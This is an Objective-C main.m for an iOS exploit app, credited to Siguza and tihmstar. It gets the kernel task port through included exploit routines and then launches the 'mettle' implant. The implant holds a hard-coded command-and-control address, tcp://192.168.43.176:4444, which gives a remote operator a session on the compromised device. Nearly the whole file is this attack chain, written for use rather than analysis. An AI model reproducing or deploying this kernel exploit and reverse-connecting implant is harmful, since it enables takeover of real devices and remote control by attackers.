/*
 * main.m - Helper file
 *
 * Copyright (c) 2017 Siguza & tihmstar
 */

#import <UIKit/UIKit.h>
#import "AppDelegate.h"

#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#include "arch.h"
#include "exploit64.h"
#include "nvpatch.h"
#include "set.h"

#include <mettle.h>

void suspend_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;

    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_suspend(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                    exit(1);
                }
            }
        }
    }
}


/*
extern char* const* environ;
int easyPosixSpawn(NSURL *launchPath,NSArray *arguments){
    NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
    [posixSpawnArguments insertObject:[launchPath lastPathComponent] atIndex:0];

    int argc=(int)posixSpawnArguments.count+1;
    printf("Number of posix_spawn arguments: %d\n",argc);
    char **args=(char**)calloc(argc,sizeof(char *));

    for (int i=0; i<posixSpawnArguments.count; i++)
        args[i]=(char *)[posixSpawnArguments[i]UTF8String];

    printf("File exists at launch path: %d\n",[[NSFileManager defaultManager]fileExistsAtPath:launchPath.path]);
    printf("Executing %s: %s\n",launchPath.path.UTF8String,arguments.description.UTF8String);

    posix_spawn_file_actions_t action;
    posix_spawn_file_actions_init(&action);

    pid_t pid;
    int status;
    status = posix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);

    if (status == 0) {
        if (waitpid(pid, &status, 0) != -1) {
            // wait
        }
    }

    posix_spawn_file_actions_destroy(&action);


    return status;
}
*/

void start_mettle()
{
  NSLog(@"start_mettle");
	struct mettle *m = mettle();
	if (m == NULL) {
		return;
	}

  c2_add_transport_uri(mettle_get_c2(m), "tcp://192.168.43.176:4444");

  NSLog(@"mettle_start");
  mettle_start(m);

  mettle_free(m);
  NSLog(@"mettle_done");
}

int main(int argc, char * argv[]) {
	NSLog(@"hello from exploit");
  suspend_all_threads();
  NSLog(@"threads suspended");

  vm_address_t kbase = 0;
  task_t kernel_task = get_kernel_task(&kbase);
  LOG("kernel_task: 0x%x", kernel_task);

  start_mettle();

   return 0;
}

